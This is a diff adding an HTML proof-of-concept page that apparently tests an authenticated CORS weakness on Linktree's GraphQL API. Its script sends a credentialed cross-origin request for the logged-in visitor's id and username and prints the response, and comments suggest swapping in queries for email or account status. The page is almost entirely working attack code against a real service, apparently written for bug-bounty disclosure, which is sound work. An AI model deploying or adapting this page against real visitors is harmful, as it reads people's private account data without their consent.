@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Authenticated CORS – Session Proof</title>
+<style>
+body { background:#0d1117; color:#c9d1d9; font-family: monospace; padding:40px }
+pre { background:#161b22; padding:20px; border:1px solid #30363d }
+button { padding:10px 20px; font-weight:bold }
+</style>
+</head>
+<body>
+
+<h2>Linktree Authenticated CORS – Session Validation</h2>
+
+<button onclick="run()">Run Test</button>
+
+<pre id="out">Waiting…</pre>
+
+<script>
+async function run() {
+  const out = document.getElementById("out");
+  out.textContent = "[*] Sending authenticated cross-origin request…";
+
+  /*
+   IMPORTANT:
+   Replace THIS query with ANY user-bound query you know is valid.
+   Examples (depends on schema):
+   - viewer { id username }
+   - me { email }
+   - account { isPro }
+  */
+
+  const query = `
+    query {
+      viewer {
+        id
+        username
+      }
+    }
+  `;
+
+  const url = "https://graph.linktr.ee/graphql?query=" + encodeURIComponent(query);
+
+  try {
+    const r = await fetch(url, {
+      credentials: "include"
+    });
+
+    const data = await r.json();
+
+    out.textContent =
+      "[+] Response received via cross-origin authenticated fetch\n\n" +
+      JSON.stringify(data, null, 2) +
+      "\n\n[!] If this output changes per logged-in user, session privacy is broken.";
+
+  } catch (e) {
+    out.textContent = "[-] Error: " + e.message;
+  }
+}
+</script>
+
+</body>
+</html>
